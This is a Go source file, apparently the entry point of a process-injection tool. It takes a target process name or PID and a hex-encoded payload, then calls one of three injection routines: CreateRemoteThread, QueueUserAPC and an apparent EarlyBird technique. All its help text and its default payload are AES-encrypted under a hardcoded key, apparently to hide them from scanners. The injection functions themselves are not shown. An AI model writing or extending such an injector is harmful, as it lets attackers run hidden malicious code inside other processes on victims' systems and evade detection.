package main

import "fmt"
import "flag"
import "strings"
import "encoding/hex"


func main() {
   var process_name string;
   var hex_payload string;
   var name_hlp string = GetAESDecrypted_aux("hga5tkM/rmTnc3bj9fjENA==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
   var payload_example string = GetAESDecrypted_aux("BbZNVwAr3ErnvDSnfcgX70AiGN6QQ+JvU2btTCYZzxzyaw4Y3eqb1hFKzBmDwaKX4KMkddU0s++RZV9l4FywSodtuZiS94Ekic3y7f5xpykS134W6D0dpyUAQBmneB7s/v25yCnAWcJMSkL10FvDMTjL1futJWMkkMoDsyGV5PVuNAp4zyMhTNrRLjej6RHdwcokIpBBEgPwZWFhNWLOpldKT29f589Z3sURW2HowiEJwZb1q89K92vND6fIGlyr+TdaCwjKpE23q2dO+/stSTb2lW6c52yiK38TBcNlGRE=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
   var payload_hlp string = GetAESDecrypted_aux("TVEqY1BQFwCU5dQ39SzzeMTuJ/qGJtkXYo2K1s0vINM=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
   var pid_hlp string = GetAESDecrypted_aux("KyrLzgV+gpWWvgqFDkbR6Q==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
   var method_hlp string = GetAESDecrypted_aux("UGgn3lUkLY5KY4M28jb+puKm7pHWApCV4Xlt6Twunas=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
   flag.StringVar(&process_name, "n", "", name_hlp)
   flag.StringVar(&hex_payload, "h", payload_example, payload_hlp)
   pid :=  flag.Int("p", 0, pid_hlp)
   method :=  flag.Int("m", 0, method_hlp)
   flag.Parse()

   hex_payload = strings.Replace(hex_payload, "\\x", "", -1);
   payload, payloadErr := hex.DecodeString(hex_payload)
   if payloadErr != nil {
      var decoding_err_msg string = GetAESDecrypted_aux("mfr7aWza5WD/srr1rQG6QP3c5Z4zJLBA8nrc6bitRmJ3AH5z80pxb9vXsuSF1nD8", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
      fmt.Println(decoding_err_msg, payloadErr.Error());
   }

   switch *method{
      case 1:
         CRT_Inj(process_name, *pid, payload)
      case 2:
         QUAPC_Inj(process_name, *pid, payload);
      case 3:
         EB_Inj(process_name, payload);
      default:
         var hlp_msg string = GetAESDecrypted_aux("OF3JIPDOBEtJXJENwUj+QiYszeKLcfeuyeuMjLnec+uuBP27q+XrpB5qPYjlRgx1AlzJL5ULPVWj7cut8EKobn4FA9n7lKIhmLn6ppbYBSNmdzlQ/16deGs1zPLYXOJD", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
         fmt.Println(hlp_msg);
   }
}